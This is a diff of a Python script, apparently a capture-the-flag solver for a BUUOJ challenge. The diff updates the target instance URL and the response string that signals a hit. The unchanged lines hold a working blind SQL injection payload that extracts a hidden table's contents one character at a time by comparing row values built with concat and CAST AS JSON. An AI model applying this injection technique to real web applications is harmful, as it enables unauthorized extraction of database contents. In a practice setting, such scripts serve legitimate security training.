@@ -4,7 +4,7 @@ import requests
 import string
 import time
 
-url = 'http://0f1075c4-e369-4031-8968-19cf74e9e351.node4.buuoj.cn:81/index.php'
+url = 'http://f4b59740-c8e4-4653-a1fd-e2be614665d2.node4.buuoj.cn:81/index.php'
 
 # 可以设置cookie、UA
 headers = {}
@@ -49,7 +49,7 @@ def get_flag():
             c = flag + c
             data = {'id': f"2||(SELECT 1,concat('{c}~', CAST(0 AS JSON)))>(select * from f1ag_1s_h3r3_hhhhh)"}
             r = requests.post(url, data)
-            if 'Nu1L' in r.text:
+            if 'Hello' in r.text:
                 flag = c
                 break
             time.sleep(.1)
